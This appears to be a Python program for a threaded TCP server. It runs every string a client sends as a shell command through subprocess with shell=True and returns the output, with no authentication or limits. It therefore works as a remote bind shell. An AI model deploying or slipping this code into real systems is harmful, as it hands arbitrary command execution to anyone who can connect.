import socket
import threading
import subprocess

HEADER = 64
PORT = 9690
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!OUT"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr} connected.")
    connected = True
    while connected:
        try:
            # Receive the command's length
            msg_length = conn.recv(HEADER).decode(FORMAT)
            if msg_length:
                msg_length = int(msg_length.strip())
                # Receive the command
                command = conn.recv(msg_length).decode(FORMAT)

                # Check for disconnect
                if command == DISCONNECT_MESSAGE:
                    connected = False
                    response ="Disconnected...."
                else:

                # Execute the command using subprocess
                    try:
                        response = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        response = f"Error executing command: {e.output}"

                # Send the result back to the client
                response_length = str(len(response)).encode(FORMAT)
                response_length += b' ' * (HEADER - len(response_length))
                conn.send(response_length)
                conn.send(response.encode(FORMAT))

        except Exception as e:
            print(f"[ERROR] {addr}: {e}")
            connected = False

    conn.close()


def start():
    server.listen()
    print(f"[LISTENING] Server is listening on {SERVER}")
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")


print("[STARTING] Server is starting....")
start()
